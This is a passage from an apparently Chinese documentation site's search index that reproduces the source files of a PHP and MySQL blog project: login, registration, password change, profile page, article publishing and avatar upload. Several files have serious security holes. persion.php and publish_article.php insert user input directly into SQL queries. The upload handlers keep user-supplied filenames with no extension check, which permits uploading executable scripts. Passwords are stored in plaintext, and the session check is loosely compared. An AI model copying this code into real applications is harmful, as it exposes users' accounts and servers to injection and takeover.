#007BFF;\n            color: white;\n            padding: 10px 20px;\n            border: none;\n            border-radius: 5px;\n            cursor: pointer;\n            text-transform: uppercase;\n        }\n\n        /* \u63d0\u4ea4\u6309\u94ae\u60ac\u505c\u6837\u5f0f */\n        input[type=\"submit\"]:hover {\n            background-color: #0056b3;\n        }\n\n        /* \u94fe\u63a5\u6837\u5f0f */\n        a {\n            color: #007BFF;\n            text-decoration: none;\n        }\n\n        /* \u94fe\u63a5\u60ac\u505c\u6837\u5f0f */\n        a:hover {\n            color: #0056b3;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;h2&gt;\u535a\u5ba2\u53d1\u8868&lt;/h2&gt;\n    &lt;form action=\"publish_article.php\" method=\"POST\"&gt;\n        &lt;label for=\"title\"&gt;\u6807\u9898\uff1a&lt;/label&gt;\n        &lt;input type=\"text\" name=\"title\" id=\"title\" required=\"\"&gt;&lt;br&gt;\n        &lt;label for=\"content\"&gt;\u5185\u5bb9\uff1a&lt;/label&gt;\n        &lt;textarea name=\"content\" id=\"content\" required=\"\"&gt;&lt;/textarea&gt;&lt;br&gt;\n        &lt;label for=\"author\"&gt;\u4f5c\u8005\uff1a&lt;/label&gt;\n        &lt;input type=\"text\" name=\"author\" id=\"author\" required=\"\"&gt;&lt;br&gt;\n        &lt;input type=\"submit\" value=\"\u53d1\u5e03\u6587\u7ae0\"&gt;\n        &lt;br&gt;\n        &lt;br&gt;&lt;a href=\"homepage.php\"&gt;\u70b9\u51fb\u8fd4\u56de\u4e3b\u9875&lt;/a&gt;&lt;/br&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#changephp","title":"change.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n// \u8fde\u63a5\u6570\u636e\u5e93\ninclude \"connect.php\";\nsession_start();\n\n// \u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\n$user = $_SESSION['user'];\n$pass = $_POST['pass'];\n$newPassword = $_POST['password'];\n$newPassword_2 = $_POST['password_2'];\n\n\n// \u51c6\u5907\u67e5\u8be2\u8bed\u53e5\n$stmt = mysqli_prepare($conn, \"SELECT user, pass FROM user WHERE user=? AND pass=?\");\nmysqli_stmt_bind_param($stmt, \"ss\", $user, $pass);\nmysqli_stmt_execute($stmt);\n\n// \u83b7\u53d6\u67e5\u8be2\u7ed3\u679c\n$result = mysqli_stmt_get_result($stmt);\n\n// \u68c0\u67e5\u67e5\u8be2\u662f\u5426\u6210\u529f\nif ($row = mysqli_fetch_assoc($result)) {\n    // \u7528\u6237\u5b58\u5728\uff0c\u66f4\u65b0\u5bc6\u7801\n    if ($newPassword != $newPassword_2) {\n        $ERR = \"\u4e24\u6b21\u8f93\u5165\u7684\u5bc6\u7801\u4e0d\u4e00\u81f4\";\n    } else if (strlen($newPassword) &gt;= 6) {\n        // \u65b0\u5bc6\u7801\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e6\u4f4d\uff0c\u66f4\u65b0\u5bc6\u7801\n        // \u66f4\u65b0\u5bc6\u7801\u65f6\u4f7f\u7528\u9884\u5904\u7406\u8bed\u53e5\n        $updateStmt = mysqli_prepare($conn, \"UPDATE user SET pass=? WHERE user=? AND pass=?\");\n        mysqli_stmt_bind_param($updateStmt, \"sss\", $newPassword, $user, $pass);\n        mysqli_stmt_execute($updateStmt);\n        echo \"&lt;a href='index.html'&gt;\u4fee\u6539\u6210\u529f\uff0c\u8fd4\u56de\u767b\u5f55&lt;/a&gt;\";\n        header('location:index.html');\n    } else {\n        echo \"\u5bc6\u7801\u957f\u5ea6\u4e0d\u8db3\u516d\u4f4d&lt;br&gt;\u4fee\u6539\u5931\u8d25\uff01\";\n    }\n} else {\n    echo \"\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\uff0c\u8fd4\u56de\u767b\u5f55&lt;/a&gt;\";\n}\n\n// \u5173\u95ed\u9884\u5904\u7406\u8bed\u53e5\u548c\u6570\u636e\u5e93\u8fde\u63a5\nmysqli_stmt_close($stmt);\nmysqli_close($conn);\n\n?&gt;\n\n\n\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;\u4fee\u6539\u5bc6\u7801&lt;/title&gt;\n    &lt;!-- \u6dfb\u52a0CSS\u6837\u5f0f --&gt;\n    &lt;style&gt;\n        body {\n            font-family: Arial, sans-serif;\n            background-color: #f0f0f0;\n        }\n\n        div {\n            width: 300px;\n            margin: 50px auto;\n            padding: 20px;\n            border: 1px solid #ccc;\n            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);\n            background-color: white;\n            text-align: center;\n        }\n\n        h2 {\n            font-size: 24px;\n            color: #333;\n            font-weight: bold;\n            line-height: 1.5;\n            margin-top: 1em;\n            margin-bottom: 0.5em;\n            text-align: center;\n        }\n\n        form p {\n            margin-bottom: 10px;\n        }\n\n        span {\n            display: inline-block;\n            width: 100px;\n            text-align: right;\n            margin-right: 10px;\n        }\n\n        input[type=\"text\"] {\n            width: 200px;\n            padding: 5px;\n            border: 1px solid #ddd;\n            border-radius: 3px;\n        }\n\n        input[type=\"submit\"] {\n            background-color: #4CAF50;\n            color: white;\n            padding: 10px 20px;\n            border: none;\n            border-radius: 3px;\n            cursor: pointer;\n            margin-left: 10px;\n        }\n\n        input[type=\"submit\"]:hover {\n            background-color: #45a049;\n        }\n\n        a {\n            display: block;\n            text-align: center;\n            color: #337ab7;\n            text-decoration: none;\n            margin-top: 15px;\n        }\n\n        a:hover {\n            color: #23527c;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;div&gt;\n        &lt;h2&gt;\u5bc6\u7801\u4fee\u6539&lt;/h2&gt;\n        &lt;form action=\"\" method=\"post\"&gt;\n            &lt;p&gt;&lt;span&gt;\u539f\u59cb\u5bc6\u7801:&lt;/span&gt;&lt;input type=\"text\" name=\"pass\" required=\"\"&gt;&lt;/p&gt;\n            &lt;p&gt;&lt;span&gt;\u65b0\u5bc6\u7801\uff1a&lt;/span&gt;&lt;input type=\"text\" name=\"password\" required=\"\"&gt;&lt;/p&gt;\n            &lt;p&gt;&lt;span&gt;\u518d\u6b21\u8f93\u5165\uff1a&lt;/span&gt;&lt;input type=\"text\" name=\"password_2\" required=\"\"&gt;&lt;/p&gt;\n            &lt;p&gt;&lt;input type=\"reset\" value=\"\u91cd\u7f6e\" /&gt;\n                &lt;input type=\"submit\" name=\"\" value=\"\u4fee\u6539\" /&gt;\n            &lt;/p&gt;\n            &lt;br&gt;&lt;/br&gt;\n            &lt;a href=\"homepage.php\"&gt;\u70b9\u51fb\u8fd4\u56de\u4e3b\u9875&lt;/a&gt;\n        &lt;/form&gt;\n\n    &lt;/div&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#homepagephp","title":"homepage.php","text":"PHP<pre><code>&lt;?php\ninclude \"session.php\";\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;\u9875\u9762\u6807\u9898&lt;/title&gt;\n    &lt;!-- \u5f15\u5165CSS\u6837\u5f0f --&gt;\n    &lt;style&gt;\n        body {\n            font-family: Arial, sans-serif;\n            background-color: #f0f0f0;\n            margin: 0;\n            padding: 20px;\n        }\n\n        a {\n            display: inline-block;\n            padding: 10px 15px;\n            text-decoration: none;\n            color: #333;\n            background-color: #e0e0e0;\n            border-radius: 4px;\n            margin-right: 10px;\n        }\n\n        a:hover {\n            background-color: #ccc;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;?php echo \"&lt;br&gt;&lt;/br&gt;\u5f53\u524d\u7528\u6237\uff1a\" . $_SESSION['user'] . \"&lt;br&gt;&lt;/br&gt;\"; ?&gt;\n    &lt;a href=\"person.php\"&gt;\u4e2a\u4eba\u4fe1\u606f&lt;/a&gt;\n    &lt;a href=\"article.html\"&gt;\u535a\u5ba2\u53d1\u8868&lt;/a&gt;\n    &lt;a href=\"article_list.php\"&gt;\u535a\u5ba2\u6d4f\u89c8&lt;/a&gt;\n    &lt;a href=\"upimg.html\"&gt;\u5934\u50cf\u4fee\u6539&lt;/a&gt;\n    &lt;a href=\"change.php\"&gt;\u5bc6\u7801\u4fee\u6539&lt;/a&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#indexhtml","title":"index.html","text":"HTML<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;\u767b\u5165&lt;/title&gt;\n    &lt;!-- \u5f15\u5165\u5916\u90e8CSS\u6587\u4ef6 --&gt;\n    &lt;link rel=\"stylesheet\" href=\"styles.css\"&gt;\n    &lt;!-- \u6216\u8005\u76f4\u63a5\u5728&lt;style&gt;\u6807\u7b7e\u5185\u5199\u5165\u5185\u90e8CSS --&gt;\n    &lt;style&gt;\n        body {\n            font-family: Arial, sans-serif;\n            background-color: #f0f0f0;\n        }\n\n        div {\n            width: 300px;\n            margin: 50px auto;\n            padding: 20px;\n            border: 1px solid #ccc;\n            background-color: white;\n            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);\n        }\n\n        h2 {\n            font-size: 24px;\n            color: #333;\n            font-weight: bold;\n            line-height: 1.5;\n            margin-top: 1em;\n            margin-bottom: 0.5em;\n            text-align: center;\n        }\n\n        form p {\n            margin-bottom: 10px;\n        }\n\n        span {\n            display: inline-block;\n            width: 100px;\n            text-align: right;\n            margin-right: 10px;\n        }\n\n        input[type=\"text\"] {\n            width: 180px;\n            padding: 5px;\n            border: 1px solid #ccc;\n        }\n\n        input[type=\"submit\"] {\n            background-color: #4CAF50;\n            color: white;\n            padding: 10px 20px;\n            border: none;\n            cursor: pointer;\n            text-align: center;\n            text-decoration: none;\n            display: inline-block;\n            font-size: 16px;\n            margin-top: 10px;\n        }\n\n        a {\n            display: block;\n            text-align: center;\n            margin-top: 10px;\n            color: #4CAF50;\n            text-decoration: none;\n        }\n\n        a:hover {\n            color: #2196F3;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;div&gt;\n        &lt;h2&gt;\u767b\u5f55&lt;/h2&gt;\n        &lt;form action=\"login.php\" method=\"post\"&gt;\n            &lt;p&gt;&lt;span&gt;\u7528\u6237\u540d: &lt;/span&gt;&lt;input type=\"text\" name=\"user\" required=\"\"&gt;&lt;/p&gt;\n            &lt;p&gt;&lt;span&gt;\u5bc6\u7801:&lt;/span&gt;&lt;input type=\"text\" name=\"pass\" required=\"\"&gt;&lt;/p&gt;\n            &lt;input type=\"submit\" value=\"\u767b\u5f55\" /&gt;\n        &lt;/form&gt;\n        &lt;a href=\"register.php\"&gt;\u65b0\u7528\u6237\u6ce8\u518c&lt;/a&gt;\n        &lt;a href=\"#\"&gt;\u5fd8\u8bb0\u5bc6\u7801\uff08\u5f85\u5b8c\u5584\uff09&lt;/a&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#loginphp","title":"login.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n\ninclude \"connect.php\";\n\n// \u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\n$user = $_POST['user'];\n$pass = $_POST['pass'];\n\n// \u51c6\u5907\u67e5\u8be2\u8bed\u53e5\n$stmt = mysqli_prepare($conn, \"SELECT * FROM user WHERE user=? AND pass=?\");\nif (!$stmt) {\n    die(\"\u67e5\u8be2\u8bed\u53e5\u51c6\u5907\u5931\u8d25\uff1a\" . mysqli_error($conn));\n}\n\n// \u7ed1\u5b9a\u67e5\u8be2\u53c2\u6570\nmysqli_stmt_bind_param($stmt, \"ss\", $user, $pass);\nif (mysqli_stmt_execute($stmt) === false) {\n    die(\"\u67e5\u8be2\u6267\u884c\u5931\u8d25\uff1a\" . mysqli_error($conn));\n}\n\n// \u83b7\u53d6\u67e5\u8be2\u7ed3\u679c\n$result = mysqli_stmt_get_result($stmt);\nif (!$result) {\n    die(\"\u67e5\u8be2\u7ed3\u679c\u83b7\u53d6\u5931\u8d25\uff1a\" . mysqli_error($conn));\n}\n\n// \u68c0\u67e5\u67e5\u8be2\u662f\u5426\u6210\u529f\n$row = mysqli_fetch_array($result, MYSQLI_NUM);\nif (!is_null($row)) {\n    echo \"\u767b\u5f55\u6210\u529f\";\n    session_start();\n    $_SESSION['login'] = \"true\";\n    // \u5c06\u7528\u6237\u540d\u5b58\u50a8\u5728sessionStorage\u4e2d\n    $_SESSION['user'] = $user;\n    header('Location: homepage.php');\n    exit;\n} else {\n    echo \"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&lt;br&gt;\u767b\u5f55\u5931\u8d25\uff01&lt;br&gt;\";\n    echo \"&lt;br&gt;&lt;a href=index.html&gt;\u70b9\u51fb\u8fd4\u56de&lt;/a&gt;&lt;/br&gt;\";\n    $_SESSION['login'] = \"false\";\n}\n\n// \u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\nmysqli_stmt_close($stmt);\nmysqli_close($conn);\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#persionphp","title":"persion.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n\n// css\u6837\u5f0f\necho \"&lt;style&gt;\n    body { font-family: Arial, sans-serif; }\n    a { color: #007BFF; text-decoration: none; }\n    img { max-width: 100px; height: auto; border-radius: 50%; }\n&lt;/style&gt;\";\n\n\n// \u5047\u8bbe\u7528\u6237\u5df2\u7ecf\u767b\u5f55\u5e76\u5c06\u7528\u6237ID\u5b58\u50a8\u5728\u4f1a\u8bdd\u4e2d\nsession_start();\n$userId = $_SESSION['user'];\n//echo $userId;\n\necho \"&lt;br&gt;&lt;a href=homepage.php&gt;\u70b9\u51fb\u8fd4\u56de\u4e3b\u9875&lt;/a&gt;&lt;/br&gt;\";\necho \"&lt;br&gt;&lt;/br&gt;\";\n\n// \u8fde\u63a5\u5230\u6570\u636e\u5e93\ninclude \"connect.php\";\n\n// \u6267\u884c\u67e5\u8be2\u64cd\u4f5c\u83b7\u53d6\u767b\u5f55\u7528\u6237\u7684\u4e2a\u4eba\u4fe1\u606f\n$sql = \"SELECT user, phone, photo FROM user WHERE user = '$userId'\";\n$result = $conn-&gt;query($sql);\n\n// \u8f93\u51fa\u767b\u5f55\u7528\u6237\u7684\u4e2a\u4eba\u4fe1\u606f\nif ($result-&gt;num_rows &gt; 0) {\n    $row = $result-&gt;fetch_assoc();\n\n    if (isset($row[\"user\"])) {\n        echo \"\u7528\u6237: \" . htmlspecialchars($row[\"user\"]) . \"&lt;br&gt;\";\n    } else {\n        echo \"\u7528\u6237\u4fe1\u606f\u4e2d\u7f3a\u5c11'user'\u5b57\u6bb5\u3002&lt;br&gt;\";\n    }\n\n    if (isset($row[\"phone\"])) {\n        echo \"\u7535\u8bdd: \" . htmlspecialchars($row[\"phone\"]) . \"&lt;br&gt;\";\n    } else {\n        echo \"\u7528\u6237\u4fe1\u606f\u4e2d\u7f3a\u5c11'phone'\u5b57\u6bb5\u3002&lt;br&gt;\";\n    }\n\n    if (isset($row[\"photo\"])) {\n        if (is_file($row[\"photo\"])) {\n            echo '&lt;img src=\"' . $row[\"photo\"] . '\" alt=\"\u5934\u50cf\"&gt;';\n        } else {\n            echo \"\u5934\u50cf\u6587\u4ef6\u4e0d\u5b58\u5728\u3002\";\n        }\n    } else {\n        echo \"\u7528\u6237\u4fe1\u606f\u4e2d\u7f3a\u5c11'photo'\u5b57\u6bb5\u3002\";\n    }\n} else {\n    echo \"\u6ca1\u6709\u627e\u5230\u767b\u5f55\u7528\u6237\u7684\u4e2a\u4eba\u4fe1\u606f\u3002\";\n}\n\n// \u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\n\n$conn-&gt;close();\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#publish_articlephp","title":"publish_article.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n\n// \u83b7\u53d6\u8868\u5355\u63d0\u4ea4\u7684\u6587\u7ae0\u4fe1\u606f\n$title = $_POST['title'];\n$content = $_POST['content'];\n$author = $_POST['author'];\n\n// \u8fde\u63a5\u6570\u636e\u5e93\ninclude \"connect.php\";\n// $conn = mysqli_connect('localhost', 'root', 'root', 'test');\n\n// \u63d2\u5165\u6587\u7ae0\u4fe1\u606f\u5230\u6570\u636e\u5e93\u8868\n$sql = \"INSERT INTO articles (title, content, author, publish_date) VALUES ('$title', '$content', '$author', NOW())\";\nmysqli_query($conn, $sql);\n\n// \u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\nmysqli_close($conn);\n\n// \u91cd\u5b9a\u5411\u5230\u6587\u7ae0\u5217\u8868\u9875\u9762\u6216\u663e\u793a\u53d1\u5e03\u6210\u529f\u6d88\u606f\nheader('Location:  article_list.php');\nexit;\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#registerphp","title":"register.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n\ninclude \"connect.php\";\n\nif ($_SERVER['REQUEST_METHOD'] == \"POST\") {\n    $name = $_POST['user'];\n    $password1 = $_POST['password1'];\n    $password2 = $_POST['password2'];\n    $phone = $_POST['phone'];\n    $tupian = $_FILES['tupian'];\n\n    $ERR = \"\";\n    $upload = false;\n\n    if (empty($name) || empty($password1) || empty($password2) || empty($phone)) {\n        $ERR = \"\u7528\u6237\u3001\u5bc6\u7801\u548c\u624b\u673a\u53f7\u7801\u4e0d\u80fd\u4e3a\u7a7a\";\n    } else if (strlen($password1) &lt; 6) {\n        $ERR = \"\u5bc6\u7801\u957f\u5ea6\u4e0d\u8db3\u516d\u4f4d\";\n    } else if ($password1 != $password2) {\n        $ERR = \"\u4e24\u6b21\u8f93\u5165\u7684\u5bc6\u7801\u4e0d\u4e00\u81f4\";\n    } else if (strlen($phone) != 11) {\n        $ERR = \"\u624b\u673a\u53f7\u7801\u683c\u5f0f\u6709\u95ee\u9898\";\n    } else {\n        if (getimagesize($_FILES[\"tupian\"][\"tmp_name\"]) === false) {\n            $ERR = \"\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0d\u662f\u56fe\u7247\";\n        } else {\n            $upload = move_uploaded_file($_FILES[\"tupian\"][\"tmp_name\"], \"tupian/\" . $_FILES[\"tupian\"][\"name\"]);\n        }\n    }\n\n    if ($ERR === \"\") {\n        if ($upload) {\n            $sql = \"INSERT INTO user (user, pass, phone, photo) VALUES (?, ?, ?, ?)\";\n            if ($stmt = $conn-&gt;prepare($sql)) {\n                // \u6dfb\u52a0 \"tupian/\" \u524d\u7f00\u5230\u6587\u4ef6\u540d\u4e2d\n                $profilePicturePath = 'tupian/' . $_FILES[\"tupian\"][\"name\"];\n\n                $stmt-&gt;bind_param(\"ssss\", $name, $password1, $phone, $profilePicturePath);\n                $stmt-&gt;execute();\n                $ERR = \"\u6ce8\u518c\u6210\u529f\uff01\";\n            } else {\n                $ERR = \"\u6ce8\u518c\u5931\u8d25\";\n            }\n        } else {\n            $ERR = \"\u4e0a\u4f20\u6587\u4ef6\u5931\u8d25\";\n        }\n    }\n}\n\nif (isset($_GET['return'])) {\n    header('Location: index.html');\n    exit;\n}\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;\u6ce8\u518c&lt;/title&gt;\n    &lt;!-- \u6dfb\u52a0\u5185\u8054\u6837\u5f0f --&gt;\n    &lt;style&gt;\n        /* \u5168\u5c40\u6837\u5f0f */\n        body {\n            font-family: Arial, sans-serif;\n            background-color: #f5f5f5;\n            padding: 20px;\n        }\n\n        form {\n            width: 100%;\n            max-width: 400px;\n            margin: 0 auto;\n            background-color: white;\n            padding: 20px;\n            border-radius: 5px;\n            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);\n        }\n\n        h2 {\n            font-size: 24px;\n            color: #333;\n            font-weight: bold;\n            line-height: 1.5;\n            margin-top: 1em;\n            margin-bottom: 0.5em;\n            text-align: center;\n        }\n\n        input[type=\"text\"],\n        input[type=\"password\"],\n        input[type=\"file\"] {\n            display: block;\n            width: 100%;\n            padding: 10px;\n            margin-bottom: 15px;\n            border: 1px solid #ccc;\n            border-radius: 3px;\n            font-size: 16px;\n        }\n\n        input[type=\"submit\"] {\n            display: block;\n            width: 100%;\n            padding: 10px;\n            background-color: #007BFF;\n            color: white;\n            border: none;\n            border-radius: 3px;\n            cursor: pointer;\n            text-transform: uppercase;\n        }\n\n        a {\n            display: block;\n            text-align: center;\n            color: #337ab7;\n            text-decoration: none;\n            margin-top: 15px;\n        }\n\n        a:hover {\n            color: #23527c;\n        }\n\n        img {\n            max-width: 100%;\n            height: auto;\n            margin-bottom: 15px;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;h2&gt;\u65b0\u7528\u6237\u6ce8\u518c&lt;/h2&gt;\n    &lt;?php if ($ERR) : ?&gt;\n        &lt;p&gt;&lt;?php echo htmlspecialchars($ERR); ?&gt;&lt;/p&gt;\n    &lt;?php endif; ?&gt;\n\n    &lt;form action=\"\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n        \u540d\u5b57\uff1a&lt;input type=\"text\" name=\"user\" required&gt;&lt;br&gt;\n        \u5bc6\u7801\uff1a&lt;input type=\"password\" name=\"password1\" required&gt;&lt;br&gt;\n        \u91cd\u65b0\u8f93\u5165\u5bc6\u7801\uff1a&lt;input type=\"password\" name=\"password2\" required&gt;&lt;br&gt;\n        \u8bf7\u8f93\u5165\u624b\u673a\u53f7\u7801\uff1a&lt;input type=\"text\" name=\"phone\" required&gt;&lt;br&gt;\n        \u4e0a\u4f20\u5934\u50cf:&lt;input type=\"file\" name=\"tupian\" accept=\"image/*\" required&gt;&lt;/br&gt;\n        &lt;label for=\"userImg\"&gt;\u8bf7\u786e\u4fdd\u5934\u50cf\u547d\u540d\u4e3a\u82f1\u6587\u540d\uff0c\u5426\u5219\u4e0a\u4f20\u5931\u8d25\uff01&lt;/label&gt;&lt;br&gt;&lt;/br&gt;\n        &lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n    &lt;/form&gt;\n\n    &lt;a href=\"index.html\"&gt;\u70b9\u6b64\u8fd4\u56de\u767b\u5f55\u9875\u9762&lt;/a&gt;&lt;br&gt;\n\n    &lt;?php if ($ERR) : ?&gt;\n        &lt;p&gt;\u4f60\u6ce8\u518c\u7684\u7528\u6237\u4e3a\uff1a&lt;?php echo htmlspecialchars($name); ?&gt;&lt;/p&gt;\n        &lt;p&gt;\u4f60\u6ce8\u518c\u7684\u624b\u673a\u53f7\u7801\u4e3a\uff1a&lt;?php echo htmlspecialchars($phone); ?&gt;&lt;/p&gt;\n    &lt;?php endif; ?&gt;\n\n    &lt;?php if ($tupian &amp;&amp; $upload) : ?&gt;\n        &lt;img src=\"&lt;?php echo htmlspecialchars(\"tupian/\" . $_FILES[\"tupian\"][\"name\"]); ?&gt;\" alt=\"\u4e0a\u4f20\u7684\u56fe\u7247\" /&gt;\n    &lt;?php endif; ?&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#sessionphp","title":"session.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n\nsession_start();\n// echo $_SESSION['login'];\nif ($_SESSION['login'] == true) {\n    echo \"\u60a8\u5df2\u767b\u9646\u6210\u529f\uff0c&lt;a href=zhuxiao.php&gt;\u70b9\u51fb\u6ce8\u9500&lt;/a&gt;&lt;br&gt;\";\n} else {\n    $_SESSION[\"login\"] == false;\n    die(\"\u60a8\u65e0\u6743\u8bbf\u95ee\uff0c&lt;a href=index.html&gt;\u70b9\u51fb\u6b64\u5904\u767b\u5f55&lt;/a&gt;&lt;br&gt;\");\n}\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#upimghtml","title":"upimg.html","text":"HTML<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;\u5934\u50cf\u4fee\u6539&lt;/title&gt;\n    &lt;style&gt;\n        /* \u901a\u7528\u6837\u5f0f */\n        body {\n            font-family: Arial, sans-serif;\n            line-height: 1.6;\n            background-color: #f5f5f5;\n            margin: 0;\n            padding: 20px;\n        }\n\n        a {\n            color: #007BFF;\n            text-decoration: none;\n        }\n\n        a:hover {\n            text-decoration: underline;\n        }\n\n        /* \u8868\u5355\u6837\u5f0f */\n        form {\n            display: inline-block;\n            border: 1px solid #ccc;\n            padding: 10px;\n            border-radius: 5px;\n            margin-bottom: 20px;\n            background-color: #fff;\n        }\n\n        label {\n            display: block;\n            margin-bottom: 5px;\n        }\n\n        input[type=\"file\"], input[type=\"submit\"] {\n            display: block;\n            margin-bottom: 10px;\n            width: 100%;\n            /* padding: 10px; */\n            font-size: 16px;\n            border: 1px solid #ccc;\n            border-radius: 3px;\n        }\n\n        input[type=\"submit\"] {\n            background-color: #007BFF;\n            color: #fff;\n            cursor: pointer;\n        }\n\n        input[type=\"submit\"]:hover {\n            background-color: #0056b3;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;a href=\"homepage.php\"&gt;\u70b9\u51fb\u8fd4\u56de\u4e3b\u9875&lt;/a&gt;&lt;br&gt;&lt;/br&gt;\n    &lt;form method=\"post\" action=\"upimg.php\" enctype=\"multipart/form-data\"&gt;\n        &lt;label for=\"userImg\"&gt;\u9009\u62e9\u9700\u8981\u4e0a\u4f20\u6216\u4fee\u6539\u7684\u5934\u50cf\u56fe\u7247\uff1a&lt;/label&gt;\n        &lt;label for=\"userImg\"&gt;\u8bf7\u786e\u4fdd\u5934\u50cf\u547d\u540d\u4e3a\u82f1\u6587\u540d\uff0c\u5426\u5219\u4e0a\u4f20\u5931\u8d25\uff01&lt;/label&gt;&lt;br /&gt;\n        &lt;input type=\"file\" name=\"userImg\" id=\"userImg\" /&gt;&lt;br /&gt;\n        &lt;input type=\"submit\" name=\"sub\" value=\"\u63d0\u4ea4\" /&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#upimgphp","title":"upimg.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n\n// \u8fde\u63a5\u6570\u636e\u5e93\ninclude \"connect.php\";\ninclude \"session.php\";\n\n// \u83b7\u53d6\u4e0a\u4f20\u7684\u56fe\u7247\u4fe1\u606f\nif (isset($_FILES['userImg'])) {\n    $img = $_FILES['userImg'];\n\n    // \u5982\u679c\u8868\u5355\u63d0\u4ea4\u6210\u529f\u5219\u6267\u884c\n    if (isset($_POST['sub'])) {\n\n        // \u5b58\u50a8\u56fe\u7247\u7684\u76ee\u6807\u76ee\u5f55\n        $targetDirectory = 'tupian/';\n        // \u56fe\u7247\u7684\u5b8c\u6574\u8def\u5f84\n\n        // \u6587\u4ef6\u540c\u540d\u5904\u7406\n        $filename = pathinfo($img['name'], PATHINFO_FILENAME);\n        $extension = pathinfo($img['name'], PATHINFO_EXTENSION);\n\n        // \u68c0\u67e5\u5e76\u751f\u6210\u4e0d\u91cd\u590d\u7684\u6587\u4ef6\u540d\n        while (file_exists($targetDirectory . $filename . '.' . $extension)) {\n            $filename .= '_';\n        }\n        $targetFile = $targetDirectory . $filename . '.' . $extension;\n\n        // \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u6709\u6548\n        if ($img['error'] !== UPLOAD_ERR_OK) {\n            die('\u4e0a\u4f20\u6587\u4ef6\u9519\u8bef\uff1a' . $img['error']);\n        }\n\n        // \u5c06\u56fe\u7247\u79fb\u52a8\u5230\u76ee\u6807\u76ee\u5f55\n        if (move_uploaded_file($img['tmp_name'], $targetFile)) {\n            // \u56fe\u7247\u79fb\u52a8\u6210\u529f\uff0c\u5c06\u56fe\u7247\u8def\u5f84\u5b58\u50a8\u5230\u6570\u636e\u5e93\n            $userId = $_SESSION['user'];\n\n            echo \"&lt;br&gt;\" . 